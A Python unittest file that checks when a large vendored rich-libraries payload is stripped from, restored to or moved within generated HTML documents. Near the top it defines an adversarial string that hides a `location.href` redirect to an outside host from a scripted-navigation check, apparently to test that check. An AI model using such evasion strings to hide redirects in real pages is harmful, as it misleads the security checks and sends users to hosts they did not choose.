#!/usr/bin/env python3
"""The vendored rich-libraries blob is carried only when the document can use it (CMH-SIZE-01).

Every document used to carry the ~1,363 KB `cmhVendoredRichLibs` payload unconditionally - 55 to
61 percent of a 2.3 MB file - stamped into the HEAD, on line 7, whether or not the document had a
single mermaid diagram or chart. It is read by exactly one consumer, the offline export, which
already knows when a document needs it.

The measurement trap these tests exist to pin: the review layer's own JavaScript contains the
selector strings `pre.mermaid`, `figure.chart canvas` and friends as STRING LITERALS, so a
detector that scans the whole document reports every document as needing the blob and the feature
silently becomes a no-op. Detection must look only inside the CONTENT region.
"""
import glob
import itertools
import json
import os
import re
import shutil
import subprocess
import sys
import time
import unittest
from html.parser import HTMLParser

HERE = os.path.dirname(os.path.abspath(__file__))
import _paths  # noqa: E402
sys.path.insert(0, _paths.TOOLS)
import vendored_libs  # noqa: E402
import new_document  # noqa: E402
from checks import parsing  # noqa: E402
from checks import resources  # noqa: E402


def _doc(fragment):
    with open(_paths.TEMPLATE, "r", encoding="utf-8", newline="") as fh:
        template = fh.read()
    return new_document.make_document(template, fragment, key="vendored-libs-test",
                                      label="Vendored", source="doc.html", kind="report")


PROSE = "<h1>Plain</h1>\n<p>No diagrams and no charts at all.</p>"
MERMAID = '<h1>Diagram</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>'
CHART = ('<h1>Chart</h1>\n<figure class="chart">'
         '<canvas id="c" class="cmh-chart" data-cmh-chart="{}"></canvas></figure>')

# An adversary for the LOCAL-BINDING half of the scripted-navigation predicate, parameterized on
# the whitespace run it plants. `%s` is the run; everything around it is what makes the predicate
# actually REACH `OFFLINE_LOCAL_LOCATION_RE` and still answer False: the run is never followed by
# an identifier, the 450 filler characters keep `location` outside the `[^)]{0,400}` window that
# follows the `(`, the trailing bare sink is what makes the predicate look for a local binding at
# all, and the trailing `const location` is the binding it then finds - which drops the verdict to
# the PREFIXED sinks, of which there are none.
_NAV_LOCAL_BINDING_EVIL = ('function%s(' + "x" * 450
                           + ';location.href="//e";const location=1;')


class NeedsDetectionTests(unittest.TestCase):
    """CMH-SIZE-01: whether a document can use the blob is decided from its CONTENT only."""

    def test_a_prose_only_document_does_not_need_the_libraries(self):
        self.assertFalse(vendored_libs.content_needs_rich_libs(_doc(PROSE)))

    def test_a_document_with_a_mermaid_diagram_needs_them(self):
        self.assertTrue(vendored_libs.content_needs_rich_libs(_doc(MERMAID)))

    def test_a_document_with_a_chart_needs_them(self):
        self.assertTrue(vendored_libs.content_needs_rich_libs(_doc(CHART)))

    def test_the_review_layers_own_selector_strings_do_not_count_as_usage(self):
        # THE trap. The built layer JS contains `pre.mermaid, div.mermaid, figure.chart canvas,
        # canvas.cmh-chart` as a literal selector string. A whole-document scan matches it and
        # reports every document as a user, which would make the whole feature a silent no-op.
        html = _doc(PROSE)
        self.assertIn("pre.mermaid", html, "fixture premise: the layer carries the selector text")
        self.assertFalse(vendored_libs.content_needs_rich_libs(html))

    def test_usage_written_after_the_content_region_does_not_count(self):
        # Only the CONTENT region is authored; anything outside it belongs to the layer.
        html = _doc(PROSE).replace("</body>", '<pre class="mermaid">x</pre></body>')
        self.assertFalse(vendored_libs.content_needs_rich_libs(html))

    def test_a_document_with_no_content_markers_is_treated_as_needing_them(self):
        # Fail SAFE: if the region cannot be located we must not strip a payload the document
        # might rely on. A too-large document is a cost; a broken offline export is a defect.
        self.assertTrue(vendored_libs.content_needs_rich_libs("<html><body>hi</body></html>"))


class StripAndRestoreTests(unittest.TestCase):
    """CMH-SIZE-01: the blob is removed when unusable and restored when it becomes usable."""

    def setUp(self):
        with open(os.path.join(_paths.DIST, "SHAREABLE.html"), "r", encoding="utf-8",
                  newline="") as fh:
            self.shareable = fh.read()
        self.blob = vendored_libs.blob_script(self.shareable)
        self.assertTrue(self.blob, "the built SHAREABLE template must carry the blob")

    def test_the_blob_is_removed_from_a_prose_only_document(self):
        html = _doc(PROSE)
        self.assertIsNotNone(vendored_libs.find_blob(html))
        out, changed = vendored_libs.apply(html, self.blob)
        self.assertTrue(changed)
        self.assertIsNone(vendored_libs.find_blob(out))
        self.assertLess(len(out), len(html) - 1000 * 1024, "the saving must be the real payload")

    def test_the_blob_is_kept_for_a_document_that_uses_charts(self):
        html = _doc(CHART)
        out, _changed = vendored_libs.apply(html, self.blob)
        self.assertIsNotNone(vendored_libs.find_blob(out))

    def test_the_blob_is_restored_when_a_document_gains_a_diagram(self):
        # The correctness risk of conditional stamping: a document stripped while it was prose
        # must get the payload back the moment it gains a diagram, or its offline export breaks.
        stripped, _ = vendored_libs.apply(_doc(PROSE), self.blob)
        self.assertIsNone(vendored_libs.find_blob(stripped))
        grew = stripped.replace("</h1>", '</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>', 1)
        out, changed = vendored_libs.apply(grew, self.blob)
        self.assertTrue(changed)
        self.assertIsNotNone(vendored_libs.find_blob(out))

    def test_a_restored_blob_is_placed_at_the_end_of_the_body(self):
        # Observability: on line 7 the payload makes the head of the file unreadable to any tool
        # that reads the start of a document.
        stripped, _ = vendored_libs.apply(_doc(PROSE), self.blob)
        grew = stripped.replace("</h1>", '</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>', 1)
        out, _ = vendored_libs.apply(grew, self.blob)
        span = vendored_libs.find_blob(out)
        # rfind, not index: the layer's own JS contains the literal "</body>" (it builds export
        # markup), so the FIRST occurrence is not the document's real body end.
        body_end = out.lower().rfind("</body>")
        self.assertGreater(span[0], out.rindex("</main>"),
                           "the restored payload must sit after the document content")
        self.assertLessEqual(span[1], body_end)

    def test_a_head_placed_payload_is_moved_out_of_the_head(self):
        # A document that legitimately needs the payload still should not carry it on line 7.
        html = _doc(CHART)
        head_end = html.lower().find("</head>")
        self.assertLess(vendored_libs.find_blob(html)[0], head_end,
                        "fixture premise: the template stamps the payload into the head")
        out, changed = vendored_libs.apply(html, self.blob)
        self.assertTrue(changed)
        self.assertGreater(vendored_libs.find_blob(out)[0], out.lower().find("</head>"))
        self.assertLessEqual(vendored_libs.find_blob(out)[1], out.lower().rfind("</body>"))

    def test_applying_twice_is_a_no_op(self):
        once, _ = vendored_libs.apply(_doc(PROSE), self.blob)
        twice, changed = vendored_libs.apply(once, self.blob)
        self.assertFalse(changed, "a second pass must not churn the document")
        self.assertEqual(twice, once)

    def test_applying_twice_is_a_no_op_for_a_document_that_keeps_the_payload(self):
        # The relocation must settle: a document that needs the payload is rewritten once and
        # then left byte-identical, or every finalize would churn it.
        once, changed = vendored_libs.apply(_doc(CHART), self.blob)
        self.assertTrue(changed)
        twice, changed_again = vendored_libs.apply(once, self.blob)
        self.assertFalse(changed_again, "an already-placed payload must not be rewritten")
        self.assertEqual(twice, once)

    def test_a_document_that_cannot_be_classified_is_never_grown(self):
        # Fail-safe must mean "leave it alone", NOT "add a payload". A foreign document has no
        # content root at all; inserting 1.3 MB into it would be far worse than doing nothing.
        foreign = "<html><body><p>not one of ours</p></body></html>\n"
        self.assertEqual(vendored_libs.content_state(foreign), vendored_libs.UNKNOWN)
        out, changed = vendored_libs.apply(foreign, self.blob)
        self.assertFalse(changed)
        self.assertEqual(out, foreign)

    def test_a_classifiable_document_without_rich_content_is_never_grown(self):
        # It has a content root and uses nothing, so it is UNUSED - which must mean "strip if
        # present", never "insert". A document that never carried the payload stays as it is.
        minimal = '<html><body><main id="commentRoot">hi</main></body></html>\n'
        self.assertEqual(vendored_libs.content_state(minimal), vendored_libs.UNUSED)
        out, changed = vendored_libs.apply(minimal, self.blob)
        self.assertFalse(changed)
        self.assertEqual(out, minimal)

    def test_stripping_without_a_blob_source_still_works(self):
        # Removal must never depend on having a payload to restore: an agent stripping a
        # document should not need the skill's built template to be reachable.
        out, changed = vendored_libs.apply(_doc(PROSE), None)
        self.assertTrue(changed)
        self.assertIsNone(vendored_libs.find_blob(out))

    def test_a_needed_but_missing_blob_is_left_alone_when_there_is_no_source(self):
        stripped, _ = vendored_libs.apply(_doc(PROSE), None)
        grew = stripped.replace("</h1>", '</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>', 1)
        out, changed = vendored_libs.apply(grew, None)
        self.assertFalse(changed, "with no payload available the document must be left as it is")
        self.assertEqual(out, grew)


class RuntimeDifferentialTests(unittest.TestCase):
    """CMH-SIZE-01: the regex detector agrees with the runtime's selectors on every real document.

    The substring parity test below only proves the two mention the same selectors. This one is
    the check that matters: a FALSE NEGATIVE deletes a payload the document's own offline export
    then demands, and fails with "Offline export is missing the vendored Chart.js bundle". So
    run a genuine HTML-parser implementation of the runtime's selector list
    (`pre.mermaid, div.mermaid, figure.chart canvas, canvas.cmh-chart,
    canvas[data-cmh-chart-points], canvas[data-cmh-chart-source]` - declared once in
    `assets/js/03-selectors.js`) over every shipped example's CONTENT region and require the
    fast regex to reach the same verdict.
    """

    class _RuntimeTruth(HTMLParser):
        """An INDEPENDENT implementation of what the runtime exporter looks for.

        It locates `#commentRoot` itself and evaluates the selector list inside it, exactly as
        `68-export-offline.js` does. It deliberately does NOT reuse anything from
        `vendored_libs`, and it deliberately does NOT use the CONTENT markers: the marker span
        is 126 - 514 bytes NARROWER than the root on the shipped examples, so scoping to the
        markers here would compare a different region than production and the differential
        would be worthless.
        """

        def __init__(self):
            HTMLParser.__init__(self, convert_charrefs=False)
            self.stack = []
            self.hit = False
            self._depth = None
            self._in_root = False
            self._done = False

        def handle_starttag(self, tag, attrs):
            attrs = dict(attrs)
            classes = (attrs.get("class") or "").split()
            if tag == "main" and attrs.get("id") == "commentRoot" and self._depth is None:
                self._depth = len(self.stack)
                self._in_root = True
            if self._in_root and not self._done:
                if tag in ("pre", "div") and "mermaid" in classes:
                    self.hit = True
                if tag == "canvas" and "cmh-chart" in classes:
                    self.hit = True
                if tag == "canvas" and any(t == "figure" and "chart" in c for t, c in self.stack):
                    self.hit = True
                if tag == "canvas" and ("data-cmh-chart-points" in attrs or "data-cmh-chart-source" in attrs):
                    self.hit = True
            if tag not in ("br", "img", "input", "meta", "link", "hr", "canvas"):
                self.stack.append((tag, classes))

        def handle_startendtag(self, tag, attrs):
            self.handle_starttag(tag, attrs)
            if tag not in ("br", "img", "input", "meta", "link", "hr", "canvas") \
                    and self.stack and self.stack[-1][0] == tag:
                self.stack.pop()

        def handle_endtag(self, tag):
            for i in range(len(self.stack) - 1, -1, -1):
                if self.stack[i][0] == tag:
                    if tag == "main" and self._depth is not None and i == self._depth:
                        self._in_root = False
                        self._done = True
                    del self.stack[i:]
                    return

    def _runtime_needs(self, html):
        truth = self._RuntimeTruth()
        truth.feed(html)
        truth.close()
        self.assertIsNotNone(truth._depth, "the runtime emulation must find #commentRoot")
        return truth.hit

    def test_the_detector_matches_the_runtime_on_every_shipped_example(self):
        examples = sorted(glob.glob(os.path.join(_paths.EXAMPLES, "*.html")))
        self.assertTrue(examples, "there must be shipped examples to check against")
        checked = 0
        for path in examples:
            with open(path, "r", encoding="utf-8", newline="") as fh:
                html = fh.read()
            expected = vendored_libs.USES if self._runtime_needs(html) else vendored_libs.UNUSED
            self.assertEqual(
                vendored_libs.content_state(html), expected,
                "%s: the author-time detector disagrees with the runtime's selectors. A false "
                "NEGATIVE here strips a payload the document's own offline export needs."
                % os.path.basename(path))
            checked += 1
        self.assertGreaterEqual(checked, 5, "expected the full example corpus, got %d" % checked)

    def test_the_corpus_covers_both_verdicts(self):
        # Guards the test above: if every example landed on the same side it would pass while
        # proving only half the behaviour.
        states = set()
        for path in glob.glob(os.path.join(_paths.EXAMPLES, "*.html")):
            with open(path, "r", encoding="utf-8", newline="") as fh:
                states.add(vendored_libs.content_state(fh.read()))
        self.assertIn(vendored_libs.USES, states)
        self.assertIn(vendored_libs.UNUSED, states)

    def test_escaped_markup_in_prose_is_not_read_as_usage(self):
        # A document ABOUT commentable-html can show `<pre class="mermaid">` as escaped sample
        # text. The runtime sees text, not an element, so the detector must too.
        escaped = '<h1>Docs</h1>\n<p>Write <code>&lt;pre class="mermaid"&gt;</code> to add one.</p>'
        self.assertEqual(vendored_libs.content_state(_doc(escaped)), vendored_libs.UNUSED)


    def test_repeated_finalize_settles_and_the_anchors_survive_decoys(self):
        """The real document contains the literal `</body>` and `</head>` inside its own JS.

        `_insert_before_body_end` / `_is_at_end_of_body` anchor on those strings, so a naive
        `find` would place the payload inside a script. Drive the REAL pipeline repeatedly and
        require it to settle, with the payload genuinely at the end of the document.
        """
        import tempfile
        import finalize

        directory = tempfile.mkdtemp(prefix="cmh-vendored-settle-")
        self.addCleanup(shutil.rmtree, directory, True)
        path = os.path.join(directory, "chart.html")
        with open(path, "w", encoding="utf-8", newline="") as fh:
            fh.write(_doc(CHART))

        sizes, offsets = [], []
        for _ in range(3):
            finalize.finalize(path)
            with open(path, "r", encoding="utf-8", newline="") as fh:
                html = fh.read()
            span = vendored_libs.find_blob(html)
            self.assertIsNotNone(span, "a chart document must keep the payload")
            sizes.append(len(html))
            offsets.append(span[0])
        self.assertEqual(len(set(sizes)), 1, "repeated finalize must not churn the document")
        self.assertEqual(len(set(offsets)), 1, "the payload must not oscillate in position")

        with open(path, "r", encoding="utf-8", newline="") as fh:
            html = fh.read()
        self.assertGreater(html.lower().count("</body>"), 1,
                           "fixture premise: the layer JS carries decoy </body> literals")
        span = vendored_libs.find_blob(html)
        self.assertEqual(html[span[1]:].strip(), "</body>\n</html>".strip(),
                         "the payload must sit immediately before the real end of the document")


class HtmlBlindnessTests(unittest.TestCase):
    """CMH-SIZE-01: detection must not be fooled by markup a regex reads differently to a browser.

    Each case here is a FALSE NEGATIVE - the runtime would use the payload, so stripping it
    leaves the document's own offline export throwing "missing the vendored Chart.js bundle".
    All three were found by review against a real generated, strict-validated document.
    """

    def test_an_unquoted_class_attribute_still_counts_as_usage(self):
        # CSS does not require quotes; `class=cmh-chart` is a valid canvas.cmh-chart.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas class=cmh-chart id="a"></canvas>')), vendored_libs.USES)

    def test_a_greater_than_inside_an_earlier_attribute_does_not_hide_the_class(self):
        # A `>` inside a quoted attribute value does not end the tag, but a `[^>]*` scan stops
        # there and never reaches the class.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas title="A &gt; B" class="cmh-chart" id="a"></canvas>'
            .replace("&gt;", ">"))), vendored_libs.USES)

    def test_a_commented_out_end_of_root_does_not_truncate_the_scan(self):
        # A literal `</main>` inside an HTML comment must not be mistaken for the end of the
        # content root, or everything after it stops being scanned.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<!-- </main> -->\n<canvas class="cmh-chart" id="a"></canvas>')),
            vendored_libs.USES)

    def test_a_commented_out_payload_in_authored_content_is_never_deleted(self):
        # DATA LOSS. A document documenting this very feature can show the payload element as a
        # commented-out example. Treating that as the real payload deletes authored content.
        sample = ('<h1>Docs</h1>\n<p>The payload looks like this:</p>\n'
                  '<!-- <script type="application/json" id="cmhVendoredRichLibs">example</script> -->\n')
        html = _doc(sample)
        self.assertIn("cmhVendoredRichLibs", html)
        first, _ = vendored_libs.apply(html, None)
        second, _ = vendored_libs.apply(first, None)
        self.assertIn("example</script> -->", second,
                      "the commented-out sample is authored content and must not be deleted")
        self.assertEqual(second, first, "a second pass must not delete the commented sample")


    def test_case_sensitivity_follows_css_not_html(self):
        # HTML lowercases TAG names, but class matching in a standards-mode document is
        # case-SENSITIVE, so `class="CMH-CHART"` does not match `canvas.cmh-chart` in the
        # browser either. Reporting it unused is agreement with the runtime, not a miss.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<CANVAS CLASS="CMH-CHART" ID="a"></CANVAS>')), vendored_libs.UNUSED)
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<CANVAS class="cmh-chart" ID="a"></CANVAS>')), vendored_libs.USES,
            "an uppercase TAG name with a correctly-cased class is still a match")

    def test_a_self_closing_canvas_inside_a_chart_figure_counts(self):
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<figure class="chart"><canvas id="a" /></figure>')), vendored_libs.USES)

    def test_attributes_split_across_lines_still_count(self):
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas\n   class="cmh-chart"\n   id="a"></canvas>')),
            vendored_libs.USES)

    def test_markup_inside_a_script_template_is_text_not_elements(self):
        # querySelector cannot see it, so neither should the detector.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<script type="text/template">'
            '<figure class="chart"><canvas id="x"></canvas></figure></script>')),
            vendored_libs.UNUSED)

    def test_the_offsets_are_exact_for_every_line_ending(self):
        # The parser maps (line, col) to a character offset through a line table. Get that
        # wrong on CRLF and a 2.3 MB document is silently corrupted when a span is cut out.
        base = _doc(PROSE)
        for label, text in (("LF", base), ("CRLF", base.replace("\n", "\r\n")),
                            ("CR", base.replace("\n", "\r"))):
            span = vendored_libs.find_blob(text)
            self.assertIsNotNone(span, "%s: the payload must be found" % label)
            self.assertTrue(text[span[0]:].startswith("<script "),
                            "%s: the span must start exactly at the element" % label)
            self.assertTrue(text[:span[1]].endswith("</script>"),
                            "%s: the span must end exactly at the element" % label)
            out, changed = vendored_libs.apply(text, None)
            self.assertTrue(changed)
            self.assertEqual(len(text) - len(out), span[1] - span[0],
                             "%s: exactly the payload must be removed, nothing more" % label)


    def test_a_padded_closing_tag_is_cut_completely(self):
        # `</script   >` is valid HTML. Assuming len("</script>") would leave orphaned bytes
        # behind in the document when the payload span is cut out.
        html = _doc(PROSE).replace(
            '</script>\n<link rel="icon"', '</script   >\n<link rel="icon"', 1)
        span = vendored_libs.find_blob(html)
        self.assertIsNotNone(span)
        self.assertTrue(html[:span[1]].rstrip().endswith(">"))
        out, changed = vendored_libs.apply(html, None)
        self.assertTrue(changed)
        self.assertNotIn("</script   >", out,
                         "the padded closing tag must be removed with its element")

    def test_a_bare_chart_canvas_the_live_renderer_draws_keeps_the_payload(self):
        # CMH-CHART-12: `canvas[data-cmh-chart-points]` (and `-source`) is part of the runtime's
        # shared chart selector list, so the live renderer draws it and the exporter provisions
        # for it even without the cmh-chart class. The author-time detector must agree, or the
        # payload the export then demands is stripped.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas id="a" data-cmh-chart-points="1,2,3"></canvas>')),
            vendored_libs.USES)
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas id="a" data-cmh-chart-source="pts"></canvas>')),
            vendored_libs.USES)

    def test_a_canvas_with_only_a_styling_chart_attribute_is_not_usage(self):
        # `data-cmh-chart-max` alone carries no data, so neither the built-in renderer nor the
        # exporter treats it as a chart. Counting it would keep 1.3 MB in every such document.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas id="a" data-cmh-chart-max="10"></canvas>')),
            vendored_libs.UNUSED)

    def test_an_authored_payload_example_inside_the_content_is_never_deleted(self):
        # DATA LOSS, found in review. A document can legitimately author a real (not commented)
        # `<script id="cmhVendoredRichLibs">` as an example. The first pass removes the head
        # payload; a second pass must NOT then eat the authored one.
        sample = ('<h1>Docs</h1>\n<p>The payload element:</p>\n'
                  '<script type="application/json" id="cmhVendoredRichLibs">'
                  '{"example":"authored"}</script>\n')
        html = _doc(sample)
        first, _ = vendored_libs.apply(html, None)
        second, changed = vendored_libs.apply(first, None)
        self.assertIn('{"example":"authored"}', second,
                      "an authored payload example is content and must never be deleted")
        self.assertFalse(changed, "the authored example must not be mistaken for the payload")
        self.assertEqual(second, first)

    def test_misnested_chart_markup_a_browser_repairs_still_counts(self):
        # A browser repairs `<p><figure class="chart"></p>...<canvas>` so the canvas ends up
        # inside the figure and the runtime matches it. A token stack does not, so classify on
        # co-occurrence inside the root instead of exact nesting: a false positive keeps bytes,
        # a false negative breaks the export.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<p><figure class="chart"></p>\n'
            '<canvas id="a" role="img" aria-label="x"></canvas></figure>')),
            vendored_libs.USES)

    def test_an_unclosed_content_root_is_recovered_rather_than_abandoned(self):
        # A browser closes an unclosed <main> at end of input. Reporting UNKNOWN would refuse to
        # act on a document that renders perfectly well.
        html = ('<html><body><main id="commentRoot">'
                '<canvas class="cmh-chart" id="a"></canvas>')
        self.assertEqual(vendored_libs.content_state(html), vendored_libs.USES)

    def test_a_decoy_body_end_in_a_comment_does_not_receive_the_payload(self):
        # `rfind("</body>")` would pick the comment, hiding a restored 1.3 MB payload inside it
        # where neither the runtime nor find_blob can see it, while apply() reported success.
        with open(os.path.join(_paths.DIST, "SHAREABLE.html"), "r", encoding="utf-8",
                  newline="") as fh:
            blob = vendored_libs.blob_script(fh.read())
        stripped, _ = vendored_libs.apply(_doc(PROSE), blob)
        grew = stripped.replace(
            "</h1>", '</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>', 1)
        # Put the decoy AFTER the real end of body. Note the fixture itself has to use rfind:
        # a plain replace(..., 1) patches the first `</body>` LITERAL, which lives inside the
        # layer's own JavaScript - the very confusion this test exists to pin.
        at = grew.rindex("</body>")
        decoyed = grew[:at] + "</body>\n<!-- the docs mention </body> here -->" + grew[at + len("</body>"):]
        out, changed = vendored_libs.apply(decoyed, blob)
        self.assertTrue(changed)
        span = vendored_libs.find_blob(out)
        self.assertIsNotNone(span, "the restored payload must be visible to the parser")
        comment_start = out.index("<!-- the docs mention")
        self.assertLess(span[1], comment_start,
                        "the payload must be placed before the real end of body, not inside "
                        "the decoy comment that follows it")

    def test_every_payload_copy_is_removed_in_one_pass(self):
        # A refresh can leave a stale second copy; one apply must clear them all, or a document
        # keeps a 1.3 MB bundle nobody looks at.
        html = _doc(PROSE)
        span = vendored_libs.find_blob(html)
        doubled = html[:span[1]] + html[span[0]:span[1]] + html[span[1]:]
        out, changed = vendored_libs.apply(doubled, None)
        self.assertTrue(changed)
        self.assertIsNone(vendored_libs.find_blob(out))
        self.assertNotIn('id="cmhVendoredRichLibs">{"encoding"', out)


    def test_a_rich_document_is_collapsed_to_exactly_one_payload_copy(self):
        # The runtime resolves the payload as infrastructure and refuses to guess between two
        # candidates (CMH-OFFLINE-08), so a rich document left with a stale second copy would be
        # un-exportable. Finalize must heal it, and the next run must be a no-op.
        html = _doc(CHART)
        span = vendored_libs.find_blob(html)
        doubled = html[:span[1]] + html[span[0]:span[1]] + html[span[1]:]
        self.assertEqual(doubled.count('id="cmhVendoredRichLibs"'), 2)
        blob = html[span[0]:span[1]]
        out, changed = vendored_libs.apply(doubled, blob)
        self.assertTrue(changed)
        self.assertEqual(out.count('id="cmhVendoredRichLibs"'), 1)
        self.assertIsNotNone(vendored_libs.find_blob(out))
        again, changed_again = vendored_libs.apply(out, blob)
        self.assertFalse(changed_again)
        self.assertEqual(again, out)


class RuntimeParityTests(unittest.TestCase):
    """CMH-SIZE-01 / CMH-CHART-12 / CMH-PRINT-07: one shared selector definition, pinned.

    The runtime declares its rich-content selectors ONCE, in `assets/js/03-selectors.js`, and the
    exporter, the live chart renderer, the PRINT surfaces, and this module's `RUNTIME_SELECTORS`
    all derive from it. These tests pin that: the constants resolve to exactly `RUNTIME_SELECTORS`,
    the exporter's usage functions query the constants rather than re-typing a literal list, the
    renderer's set is a SUBSET of the exporter's so anything drawn live is provisioned for on
    export, and the two print surfaces cap exactly the shared mermaid host set.
    """

    _CONST_RE = re.compile(r"^const (CMH_[A-Z0-9_]+)\s*=\s*(.+?);\s*$", re.M | re.S)

    def _read(self, *parts):
        path = os.path.join(_paths.DEV, "assets", "js", *parts)
        with open(path, "r", encoding="utf-8", newline="") as fh:
            return fh.read()

    def _read_css(self, *parts):
        path = os.path.join(_paths.DEV, "assets", "css", *parts)
        with open(path, "r", encoding="utf-8", newline="") as fh:
            return fh.read()

    def _scan_js(self, source):
        """Split JavaScript source into (string-literal contents, code-with-literals-blanked).

        One scan serves both print checks. Literals matter because a re-typed selector can only
        reach the browser through one; the blanked copy matters because `measureCss()`'s CSS
        strings are full of `{`/`}` that would wreck a naive brace match, and because a comment
        that merely NAMES an identifier must not be able to stand in for the code that used it.
        Walking the source keeps quotes and comments straight, where a regex stripper would either
        miss a trailing `//` (false red) or eat a `/*` inside a string (false green).

        REGEX LITERALS ARE NOT MODELLED - they also open with `/`, and one containing a quote
        would flip this scanner into a bogus string and silently swallow real code, which is the
        false-GREEN direction. That is why the scan self-checks below rather than trusting itself:
        a guard against silent drift must not drift silently. `68-export-offline.js`, two sibling
        tests away, already contains such literals, so this is a live maintenance trap and not a
        theoretical one.
        """
        literals, code, i, n = [], [], 0, len(source)
        while i < n:
            ch = source[i]
            if ch == "/" and i + 1 < n and source[i + 1] == "/":
                end = source.find("\n", i)
                end = n if end == -1 else end
                code.append(" " * (end - i))
                i = end
            elif ch == "/" and i + 1 < n and source[i + 1] == "*":
                end = source.find("*/", i + 2)
                self.assertNotEqual(end, -1, "unterminated block comment; the JS scanner cannot "
                                             "read this file, so nothing below can be trusted")
                end += 2
                code.append(" " * (end - i))
                i = end
            elif ch in "\"'`":
                quote, start, i, buf = ch, i, i + 1, []
                while i < n and source[i] != quote:
                    if source[i] == "\\":
                        i += 1
                    if i < n:
                        buf.append(source[i])
                    i += 1
                self.assertLess(i, n, "unterminated string literal; the JS scanner cannot read "
                                      "this file (a regex literal it mistook for a quote?), so "
                                      "nothing below can be trusted")
                i += 1
                literal = "".join(buf)
                if quote != "`":
                    # JS forbids a raw newline in a '' or "" literal, so one here means the scan
                    # desynchronized and is swallowing real code - exactly how a smuggled host
                    # would go unseen. Fail loudly instead of reporting nothing.
                    self.assertNotIn("\n", literal,
                                     "the JS scanner produced a multi-line %s literal, so it has "
                                     "lost track of this file (a regex literal?); teach it the "
                                     "construct rather than trusting these checks" % quote)
                literals.append(literal)
                code.append(" " * (i - start))
            else:
                code.append(ch)
                i += 1
        code = "".join(code)
        # Blanking is length-preserving by construction on every branch; `_function_body` slices
        # by these indices, so assert it rather than assume it.
        self.assertEqual(len(code), len(source), "the JS scanner changed the source length")
        self.assertEqual(code.count("{"), code.count("}"),
                         "braces do not balance after blanking; the JS scanner cannot read this "
                         "file, so any function body it extracts is the wrong span")
        return literals, code

    def _function_body(self, code, name):
        """Return the brace-balanced body of `function <name>(...)` from BLANKED code.

        `code` must be the strings-and-comments-blanked copy from `_scan_js`, for two reasons.
        Braces inside `measureCss()`'s CSS strings would wreck a naive brace match; and an
        assertion about what a function DOES must not be satisfiable by a comment that merely
        NAMES the identifier - commenting out the live read and the live call while leaving both
        words visible in prose is exactly the false green this returns blanked text to prevent.
        """
        start = code.find("function " + name + "(")
        self.assertNotEqual(start, -1,
                            "the runtime no longer defines %s(); this check is stale and must be "
                            "re-pointed at whatever replaced it" % name)
        open_brace = code.find("{", start)
        self.assertNotEqual(open_brace, -1, "%s() has no body" % name)
        depth = 0
        for i in range(open_brace, len(code)):
            if code[i] == "{":
                depth += 1
            elif code[i] == "}":
                depth -= 1
                if depth == 0:
                    return code[open_brace + 1:i]
        self.fail("%s() body is not brace-balanced" % name)

    @staticmethod
    def _strip_css_comments(css):
        """CSS has only `/* */`. The prose above a rule explains which hosts it caps, so leaving
        comments in would let a comment SATISFY a check about the selector - the false green that
        makes a drift guard worthless."""
        return re.sub(r"/\*.*?\*/", " ", css, flags=re.S)

    def _mermaid_hosts(self):
        hosts = self._selector_constants().get("CMH_MERMAID_SEL")
        self.assertTrue(hosts,
                        "the runtime no longer declares CMH_MERMAID_SEL (or declares it empty); "
                        "the print parity checks are stale and must be re-pointed at whatever "
                        "replaced it")
        # `_printMermaidCapSel()` in 83-print.js derives the print cap by splitting this constant
        # on "," and wrapping each part, and this file's CSS pin matches one `<element>.<class>`
        # token per host. A host carrying a nested comma (`:is(pre,div).mermaid`, an attribute
        # selector) or no element prefix would break one or both silently, and a single invalid
        # selector makes a browser drop the ENTIRE tall-media rule - which also caps figures and
        # images. Fail loudly here instead, so the vocabulary cannot outgrow its consumers
        # without anyone noticing.
        for host in hosts:
            self.assertRegex(
                host, r"^[A-Za-z][\w-]*\.[\w-]+$",
                "CMH_MERMAID_SEL host %r is no longer a flat `<element>.<class>` selector. Two "
                "things depend on that shape: the comma-splitting derivation in "
                "_printMermaidCapSel() (assets/js/83-print.js), and the CSS pin in this file, "
                "which scans 92-print.css for one such token per host. Teach whichever of them "
                "the new shape rather than leaving the runtime to emit an invalid selector that "
                "drops the whole cap." % host)
        return hosts

    def _selector_constants(self):
        """Resolve `03-selectors.js` into {constant name: [selector, ...]}.

        The values are string literals concatenated with earlier constants, so evaluate them in
        declaration order rather than assuming any one shape - a future constant built from two
        others must resolve too, or this check silently stops covering it. Tokens are scanned
        rather than split on `+`, because `+` is also a CSS sibling combinator.
        """
        source = self._read("03-selectors.js")
        term_re = re.compile(r"\"([^\"]*)\"|'([^']*)'|`([^`]*)`|([A-Za-z_$][\w$]*)")
        values = {}
        for name, expr in self._CONST_RE.findall(source):
            out = []
            for m in term_re.finditer(expr):
                literal = next((g for g in m.groups()[:3] if g is not None), None)
                if literal is not None:
                    out.append(literal)
                    continue
                ref = m.group(4)
                self.assertIn(ref, values,
                              "%s is built from %r, which is not a string literal or an "
                              "already-declared selector constant" % (name, ref))
                out.append(values[ref])
            values[name] = "".join(out)
        self.assertTrue(values, "no selector constants found in 03-selectors.js")
        # A declaration this parser could not read would be silently DROPPED, and the parity check
        # would keep passing while that selector quietly stopped being pinned - the exact silent
        # regression these tests exist to prevent. Fail loudly instead.
        self.assertEqual(
            len(values), len(re.findall(r"^const CMH_[A-Z0-9_]+\s*=", source, re.M)),
            "a selector constant in 03-selectors.js was not parsed; teach _CONST_RE its shape "
            "rather than leaving it unpinned")
